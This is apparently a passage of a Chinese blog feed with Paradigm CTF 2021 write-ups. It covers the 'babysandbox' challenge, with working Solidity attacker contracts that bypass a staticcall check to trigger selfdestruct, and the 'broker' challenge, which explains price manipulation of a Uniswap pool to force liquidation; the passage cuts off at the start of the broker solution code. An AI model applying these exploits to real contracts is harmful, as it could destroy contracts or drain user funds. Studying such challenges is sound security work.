&#125;</span><br><span class="line"></span><br><span class="line">    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) &#123;</span><br><span class="line">        (address token0, address token1) = sortTokens(tokenA, tokenB);</span><br><span class="line">        </span><br><span class="line">        pair = address(uint160(uint256(keccak256(abi.encodePacked(</span><br><span class="line">                hex&#x27;ff&#x27;,</span><br><span class="line">                factory,</span><br><span class="line">                keccak256(abi.encodePacked(token0, token1)),</span><br><span class="line">                // 这个是我编译出来的bytecode的哈希值</span><br><span class="line">                hex&#x27;f0e60e1779ec5ef88ad36bab3e3e0cad28189353ab5bf1f719a2855de1c74e52&#x27; // init code hash</span><br><span class="line">            )))));</span><br><span class="line">    &#125;</span><br><span class="line">    function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) &#123;</span><br><span class="line">        require(tokenA != tokenB, &#x27;UniswapV2Library: IDENTICAL_ADDRESSES&#x27;);</span><br><span class="line">        (token0, token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA);</span><br><span class="line">        require(token0 != address(0), &#x27;UniswapV2Library: ZERO_ADDRESS&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署WETH</span><br><span class="line">    function deployHelper_weth(string memory what) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = vm.getCode(what);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode, 0x20), mload(bytecode))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署u_factory</span><br><span class="line">    function deployHelper_u_factory() public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE_factory;</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(msg.sender)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 部署u_router</span><br><span class="line">    function deployHelper_u_router(address _u_factory, address _weth) public returns (address addr) &#123;</span><br><span class="line">        bytes memory bytecode = BYTECODE_router;</span><br><span class="line">        // 构造器有参数</span><br><span class="line">        bytes memory bytecode_withConstructor = abi.encodePacked(bytecode, abi.encode(address(_u_factory), address(_weth)));</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create(0, add(bytecode_withConstructor, 0x20), mload(bytecode_withConstructor))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:.</span><br><span class="line">│  attackTest.sol</span><br><span class="line">│</span><br><span class="line">└─tools</span><br><span class="line">        factory.sol</span><br><span class="line">        helper_COMP.sol</span><br><span class="line">        helper_DAI.sol</span><br><span class="line">        helper_WETH9.sol</span><br><span class="line">        interface.sol</span><br><span class="line">        pair.sol</span><br><span class="line">        router.sol</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>05.babysandbox</title>
      <link href="/2023/09/18/19.Paradigm%20CTF%202021/05.babysandbox/"/>
      <url>/2023/09/18/19.Paradigm%20CTF%202021/05.babysandbox/</url>
      
        <content type="html"><![CDATA[<h1 id="babysandbox"><a href="#babysandbox" class="headerlink" title="babysandbox"></a>babysandbox</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul><li>Setup：初始化题目</li><li>BabySandbox：只有一个run方法</li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>使sandbox合约的代码长度为0，即销毁sandbox合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">    uint size;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        size := extcodesize(sload(sandbox.slot))</span><br><span class="line">    &#125;</span><br><span class="line">    return size == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>做本题需要了解的操作码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">call(): msg.sender</span><br><span class="line">address(): address(this), address of the executing contract</span><br><span class="line">delegatecall(g, a, in, insize, out, outsize):</span><br><span class="line">| gas | addr | argsOffset | argsLength | retOffset | retLength | ==&gt; | success |</span><br><span class="line">gas(): gas still available to execution</span><br><span class="line">returndatacopy(t, f, s): copy s bytes from returndata at position f to mem at position t</span><br><span class="line">returndatasize(): size of the last returndata</span><br><span class="line">calldatacopy(t, f, s)：从位置f的calldata复制s字节到位置t的内存中，把输入数据加载到Memory中</span><br><span class="line">calldatasize(): size of call data in bytes</span><br><span class="line">staticcall(g, a, in, insize, out, outsize): </span><br><span class="line">identical to `call(g, a, 0, in, insize, out, outsize)` but do not allow state modifications</span><br><span class="line">| gas | addr | argsOffset | argsLength | retOffset | retLength | ==&gt; | success |</span><br><span class="line">call(g, a, v, in, insize, out, outsize):</span><br><span class="line">| gas | addr | value | argsOffset | argsLength | retOffset | retLength | ==&gt; | success |</span><br></pre></td></tr></table></figure><p>让我们来用外部合约来调用一次<code>run()</code>：</p><ol><li><code>if eq(caller(), address())</code>不会进入，因为调用者不是此合约</li><li><code>if lt(gas(), 0xf000)</code>，当然有足够的gas</li><li><code>calldatacopy(0x00, 0x00, calldatasize())</code>：从位置0x00的calldata复制<code>calldatasize()</code>字节到位置0x00的内存中，也就是将所有的calldata放到内存0x00的位置</li><li><code>if iszero(staticcall(0x4000, address(), 0, calldatasize(), 0, 0))</code>：如果成功调用，<code>staticcall()</code>返回true即1，不会被revert，反之如果修改了状态则返回0被revert<ul><li>0x4000：此次staticcall最多消耗0x4000gas</li><li><code>address()</code>, <code>0</code>, <code>calldatasize()</code>: 执行此合约的<code>run()</code>，因为从0位置开始读取<code>calldatasize()</code>的内容就是<code>run()</code></li><li><code>0</code>, <code>0</code>: 不需要返回值。</li></ul></li><li>再次重入执行此合约的<code>run()</code><ol><li><code>if eq(caller(), address())</code>：判断成功，进入</li><li><code>switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)</code>：调用我们输入的地址<code>code</code>，要求：不得修改此合约状态(否则staticcall失败)，并且成功调用（否则switch选择0失败）。由于后面全是0x00，那么就是进入到地址<code>code</code>的<code>fallabck()</code></li><li><code>return(0x00, returndatasize())</code>：此次重入<code>run()</code>执行完毕</li></ol></li><li><code>switch call(0x4000, address(), 0, 0, calldatasize(), 0, 0)</code>：再次重入此合约的run()，但可以修改状态了<ol><li><code>if eq(caller(), address())</code>：为true</li><li><code>switch delegatecall(gas(), code, 0x00, 0x00, 0x00, 0x00)</code>：调用我们输入的地址<code>code</code>，要求：成功调用</li><li>那么此时我们就可以执行地址<code>code</code>中的代码逻辑，如果fallback中含有<code>selfdestruct()</code>，则完成题目。</li></ol></li></ol><p>看完这个流程，其实就是将Ethernaut的<a href="https://www.levi104.com/2023/06/23/04.Ethernaut%20CTF/11.Elevator/">电梯那关</a>用内联汇编出题，原理是一样的。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.7.0;</span><br><span class="line">pragma experimental ABIEncoderV2; // https://github.com/foundry-rs/foundry/issues/4376</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/05.babysandbox/Setup.sol&quot;;</span><br><span class="line">import &quot;./attacker01.sol&quot;;</span><br><span class="line">import &quot;./attacker02.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract attackTest is Test &#123;</span><br><span class="line">    Setup public level;</span><br><span class="line">    BabySandbox babySandbox;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        // 初始化题目</span><br><span class="line">        level = new Setup();</span><br><span class="line">        babySandbox = level.sandbox();</span><br><span class="line"></span><br><span class="line">        // 因为foundry只有在一次调用结束的时候，才会更新账户的代码长度信息,网址：</span><br><span class="line">        // https://github.com/foundry-rs/foundry/issues/1543</span><br><span class="line">        // 因此我们借助在setup中调用，然后在test_isComplete()中就可以检测到是否完成</span><br><span class="line"></span><br><span class="line">        // 解法1</span><br><span class="line">        attacker01 hack = new attacker01();</span><br><span class="line">        vm.label(address(hack), &quot;attacker01&quot;);</span><br><span class="line">        babySandbox.run(address(hack));</span><br><span class="line">        //解法2</span><br><span class="line">        // attacker02 hack = new attacker02();</span><br><span class="line">        // vm.label(address(hack), &quot;attacker02&quot;);</span><br><span class="line">        // babySandbox.run(address(hack));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isComplete() public&#123;</span><br><span class="line">        assertEq(level.isSolved(), true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解法1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.7.0;</span><br><span class="line"></span><br><span class="line">contract attacker01 &#123;</span><br><span class="line">    // immutable会在合约初始化的时候完成赋值</span><br><span class="line">    attacker01 public immutable self = this;</span><br><span class="line">    uint256 public isStateChange = 1;</span><br><span class="line"></span><br><span class="line">    function changeState() external &#123;</span><br><span class="line">        // 在这里面不能做太多操作，因为BabySandbox做了gas的限制</span><br><span class="line">        isStateChange = 0;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        // 第一次staticcall + delegatecall: 修改了状态，报错，但是会catch住，程序不会停止，而是往下走</span><br><span class="line">        // 第二次call + delegatecall: 正常执行</span><br><span class="line">        try self.changeState() &#123; </span><br><span class="line">            selfdestruct(msg.sender); </span><br><span class="line">        &#125; catch &#123;&#125; </span><br><span class="line">    &#125;</span><br><span class="line">    // 不能有receive()，否则不会走fallback()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解法2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.7.0;</span><br><span class="line"></span><br><span class="line">contract attacker02 &#123;</span><br><span class="line">    // immutable会在合约初始化的时候完成赋值</span><br><span class="line">    address immutable exploit;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        exploit = address(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Ping();</span><br><span class="line">    function stateChangingAction() external &#123;</span><br><span class="line">        emit Ping();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        (bool success, ) = exploit.call(abi.encodeWithSelector(this.stateChangingAction.selector));</span><br><span class="line">        if (success) &#123;</span><br><span class="line">            selfdestruct(payable(address(0x0)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // 不能有receive()，否则不会走fallback()</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 19.Paradigm CTF 2021 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>04.broker</title>
      <link href="/2023/09/18/19.Paradigm%20CTF%202021/04.broker/"/>
      <url>/2023/09/18/19.Paradigm%20CTF%202021/04.broker/</url>
      
        <content type="html"><![CDATA[<h1 id="broker"><a href="#broker" class="headerlink" title="broker"></a>broker</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-全局观"><a href="#1-全局观" class="headerlink" title="1.全局观"></a>1.全局观</h3><ul><li>Broker.sol<ul><li>IUniswapV2Pair：接口</li><li>ERC20Like：接口</li><li>WETH9：接口</li><li>Broker：<ul><li>属性：交易对池子、WETH、用于清算的token，记录存取款的mapping</li><li>存款、取款、借款、还款</li><li>清算机制：阈值是2/3</li></ul></li></ul></li><li>Setup.sol<ul><li>Token：ERC20合约，有空投方法（只能领取一次），除此之外只有转账和授权方法</li><li>IUniswapV2Factory：接口</li><li>Setup：<ul><li>属性：WETH、UniswapV2Factory、用于清算的token、交易对池子、broker</li><li>初始化题目</li></ul></li></ul></li></ul><h3 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h3><p>使得broker合约的WETH余额小于5 ether</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">    return weth.balanceOf(address(broker)) &lt; 5 ether;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><h4 id="3-1资产与池子"><a href="#3-1资产与池子" class="headerlink" title="3.1资产与池子"></a>3.1资产与池子</h4><p>先看看题目初始化情况：初始化池子（比例为20_000: 1），broker合约资产情况初始化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// create and bootstrap the token/weth pool for borrowing against WETH</span><br><span class="line">constructor() payable &#123;</span><br><span class="line">    // 本合约拥有 50 ether</span><br><span class="line">    require(msg.value == 50 ether);</span><br><span class="line">    // 本合约在WETH合约拥有 50 ether</span><br><span class="line">    weth.deposit&#123;value: msg.value&#125;();</span><br><span class="line"></span><br><span class="line">    // 新建一个用于清算的token</span><br><span class="line">    token = new Token();</span><br><span class="line">    // 创建交易对池子：WETH 和 Ltoken</span><br><span class="line">    pair = IUniswapV2Pair(factory.createPair(address(weth), address(token)));</span><br><span class="line">    // 创建Broker</span><br><span class="line">    broker = new Broker(pair, ERC20Like(address(token)));</span><br><span class="line">    // 本合约将一半的Ltoken转给broker</span><br><span class="line">    token.transfer(address(broker), 500_000 * DECIMALS);</span><br><span class="line"></span><br><span class="line">    // 1:25</span><br><span class="line">    // 本合约向池子转25WETH</span><br><span class="line">    weth.transfer(address(pair), 25 ether);</span><br><span class="line">    // 本合约向池子转2500_000个Ltoken</span><br><span class="line">    token.transfer(address(pair), 500_000 * DECIMALS);</span><br><span class="line">    // 此时池子的比例：500_000：25 = 20_000: 1</span><br><span class="line"></span><br><span class="line">    // 因为本合约提供了流动性，因此mint LPtoken给本合约</span><br><span class="line">    pair.mint(address(this));</span><br><span class="line"></span><br><span class="line">    // 本合约授权：broken可以操作本合约在WETH的资产</span><br><span class="line">    weth.approve(address(broker), type(uint256).max);</span><br><span class="line">    // 本合约在broker中存款25ether</span><br><span class="line">    broker.deposit(25 ether);</span><br><span class="line">    // 本合约在broker中取款250_000数量的Ltoken</span><br><span class="line">    broker.borrow(250_000 * DECIMALS);</span><br><span class="line"></span><br><span class="line">    // 总资产：broker的WETH余额 + broker在Ltoken的安全余额</span><br><span class="line">    totalBefore = weth.balanceOf(address(broker)) + token.balanceOf(address(broker)) / broker.rate();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来捋一下资产情况：</p><div class="table-container"><table><thead><tr><th></th><th>资产</th><th>授权情况</th><th>在Broker存款记录</th><th>在Broker借款记录</th><th>阈值</th><th>健康状态</th></tr></thead><tbody><tr><td>Setup</td><td>满额LPtoken, 250_000Ltoken</td><td>WETH: broker==&gt; MAX</td><td>deposited：25WETH</td><td>debt：250_000Ltoken</td><td>~333_333</td><td>~16_666</td></tr><tr><td>Broker</td><td>250_000Ltoken, 25WETH</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>WETH</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Ltoken</td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></div><p>池子：</p><div class="table-container"><table><thead><tr><th></th><th>WETH</th><th>Ltoken</th><th>比例</th><th>Broker的rate</th></tr></thead><tbody><tr><td>池子</td><td>25</td><td>500_000</td><td>20_000: 1</td><td>20_000 * (2 / 3)~=13_333</td></tr></tbody></table></div><h4 id="3-2漏洞发掘"><a href="#3-2漏洞发掘" class="headerlink" title="3.2漏洞发掘"></a>3.2漏洞发掘</h4><p>了解了题目初始化的资产情况和池子的情况之后，我们很清楚我们该改什么，将Broker持有的25WETH减少到不足5WETH即可。那么在本题，肯定是利用池子进行操作。</p><p>我们作为玩家，什么都没有，但我们可以获取Ltoken的空投，拿到这笔钱，就有干大事的可能性了哈哈。一个用户只能领取一次，一次10Ltoken，但是没有空投没有额度限制，就是说，我们可以创建多个账户，薅羊毛，然后再发到一个账户，理论上我可以获得无限的Ltoken。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function airdrop() public &#123;</span><br><span class="line">    require(!dropped[msg.sender], &quot;err: only once&quot;);</span><br><span class="line">    dropped[msg.sender] = true;</span><br><span class="line">    balanceOf[msg.sender] += AMT;</span><br><span class="line">    totalSupply += AMT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我拥有无限的Ltoken，那么我就可以控制池子的价格：用Ltoken换WETH，使得WETH价格大涨，我拿到几乎25WETH，而池子中的WETH几乎归零。</p><p>但这样跟我们想做的相反，WETH大涨，那么Setup就无法被清算，因此我们应该是增加池子中的WETH数量，导致WETH降价，从而被清算，还记得上一题，我们一开始就拥有5000ETH，那么我们可以全部换成WETH，然后控制池子的价格，让Setup被清算。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 清算</span><br><span class="line">function liquidate(address user, uint256 amount) public returns (uint256) &#123;</span><br><span class="line">    // 负债大于质押，可清算</span><br><span class="line">    require(safeDebt(user) &lt;= debt[user], &quot;err: overcollateralized&quot;);</span><br><span class="line">    // 清算借款人的一定数量amount金额，用token清算</span><br><span class="line">    debt[user] -= amount;</span><br><span class="line">    token.transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    </span><br><span class="line">    // 清算人得到WETH，不过是得到 2/3 amount 的WETH</span><br><span class="line">    uint256 collateralValueRepaid = amount / rate();</span><br><span class="line">    weth.transfer(msg.sender, collateralValueRepaid);</span><br><span class="line">    return collateralValueRepaid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这么一来，空投那个函数便没有啥作用了，应该是用来迷惑玩家的。</p><h4 id="3-3漏洞利用"><a href="#3-3漏洞利用" class="headerlink" title="3.3漏洞利用"></a>3.3漏洞利用</h4><p>让我们来计算一下应该怎么操纵价格.</p><p>Setup借了250_000Ltoken，那么安全的价格根据公式<code>deposited[user] * rate() * 2 / 3</code>得到<code>rate()</code>为：15000，因此WETH的价格应该为15000个Ltoken或者更少，否则无法被清算。</p><p>达到清算阈值之后，我们想办法清算一定数量，然后让Broker转出去20~25个代币即可，不能多也不能少，多了余额不足报错，少了完成不了题目。清算的时候Broker是这样计算转出去的WETH数量的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 清算人得到WETH</span><br><span class="line">// 实际清算的WETH数量 * WETH价格 = 清算的WETH数量</span><br><span class="line">// 那么，amount设置为：想要清算的数目n * rate() = y</span><br><span class="line">// amount / rate() = y / rate() = n * rate() / rate() = n</span><br><span class="line">// 这样就想扣除Broker多少WETH就扣除多少(n)</span><br><span class="line">uint256 collateralValueRepaid = amount / rate();</span><br><span class="line">weth.transfer(msg.sender, collateralValueRepaid);</span><br></pre></td></tr></table></figure><p>因此，我们如果想要扣除Broker25个WETH，这么计算即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uint amount_liquidate = 25 ether * broker.rate();</span><br><span class="line">broker.liquidate(address(level), amount_liquidate);</span><br></pre></td></tr></table></figure><p>控制价格的时候，要把价格控制到15000以下，选择一个合适的价格，并且在swap之后拥有足够数量的Ltoken，因为清算的时候需要足够的token。</p><p>思路：</p><ol><li>存款ETH获得WETH</li><li>在池子中交易：用WETH买Ltoken，导致WETH降价，Ltoken涨价</li><li>清算</li></ol><h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>因为比赛已经过去，只能本地模拟它的比赛环境。在用foundry部署的时候，遇到了不少问题，也学到了不少：</p><ul><li>比赛的时候，给的WETH、factory、router地址是固定的，因此我需要重新部署一个uniswapV2系统。但这就导致了Broker计算价格的时候函数<code>rate()</code>顺序错误，然后在Setup合约初始化的时候<code>borrow()</code>报错。原因是：uniswapV2根据币对进行排序，我在本地部署出来的地址不一样，导致sort排序币对之后结果不一样，因此需要修改比对价格计算位置。</li><li>进行swap的时候，一直显示EVM error revert问题，问题找了六七个小时，一步一步排查不断在UniswapV2的源代码中调试<code>require(false, &quot;test&quot;)</code>，最终，在router.B2library.sol中的pairFor计算币对地址的地方找到错误：Setup合约在<code>createPair()</code>的时候计算出来的地址和swap的时候进入library.<code>pairFor()</code>计算出来的结果不一样。原因是：library.<code>pairFor()</code>是利用CREATE2原理链下计算pair地址的，其中硬编码了bytecode的哈希值，但是，我部署的uniswapV2系统编译出来的bytecode然后hash得到的哈希值和uniswapV2官方的不一样，因此在swap的时候找不到币对然后报错EVM error revert。编译器版本相同、源代码相同，但是编译出来的bytecode也有可能不一样！</li></ul><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>因为是本地部署foundry模拟题目环境，因此题目的代码稍微改动了一点，但效果是差不多的，考点也一样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line">// 